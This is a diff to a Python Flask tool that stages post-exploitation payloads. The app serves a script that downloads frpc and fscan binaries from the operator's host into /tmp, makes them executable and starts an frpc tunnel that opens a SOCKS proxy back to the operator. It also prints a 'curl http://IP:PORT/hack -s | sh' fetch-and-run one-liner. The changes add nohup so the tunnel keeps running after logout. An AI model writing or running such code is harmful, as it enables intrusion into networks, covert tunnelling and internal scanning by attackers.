@@ -45,7 +45,7 @@ def root():
     replace(CACHE_PATH + FRPCNAME, CACHE_PATH + FRPCNAME, "{{frpsport}}", str(FRPSPORT))
     replace(RESOURCE_PATH + "frps.ini", CACHE_PATH + FRPSNAME, "{{frpsport}}", str(FRPSPORT))
 
-    subprocess.Popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &", shell=True)
+    subprocess.Popen("nohup " + RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &", shell=True)
     print("[+] frps running on {IP}:{FRPSPORT}".format(IP=IP, FRPSPORT=FRPSPORT))
     
     code = '''curl http://{IP}:{PORT}/frpc -o /tmp/frpc -s && 
@@ -55,7 +55,7 @@ def root():
     curl http://{IP}:{PORT}/fscan -o /tmp/fscan -s && 
     echo "[+] fscan download completed"
     chmod +x /tmp/frpc && chmod +x /tmp/fscan && 
-    /tmp/frpc -c /tmp/frpc.ini & '''.format(IP=IP, PORT=PORT)
+    nohup /tmp/frpc -c /tmp/frpc.ini & '''.format(IP=IP, PORT=PORT)
     print("[+] proxy: socks {IP}:{PROXYPORT} admin password".format(IP=IP, PROXYPORT=PROXYPORT))
     return code
 
@@ -82,13 +82,13 @@ def replace(inputfilename, outputfilename, before, after):
     os.chmod(outputfilename, 0o777)
 
 if __name__ == "__main__":
-    # eg: python3 app.py 1.1.1.1 12345
+    # e.g. python3 app.py 1.1.1.1 12345
     if len(sys.argv) != 3:
-        print('eg: python3 app.py 1.1.1.1 12345')
+        print('e.g. python3 app.py 1.1.1.1 12345')
         sys.exit()
     os.popen("chmod -R 777 .")
     IP = sys.argv[1]
     PORT = sys.argv[2]
-    print("[+] curl http://{}:{}/hack -s | sh".format(IP, PORT))
+    print("[+] curl http://{}:{}/hack -s | sh &".format(IP, PORT))
     app.run(host="0.0.0.0", port=PORT)
     
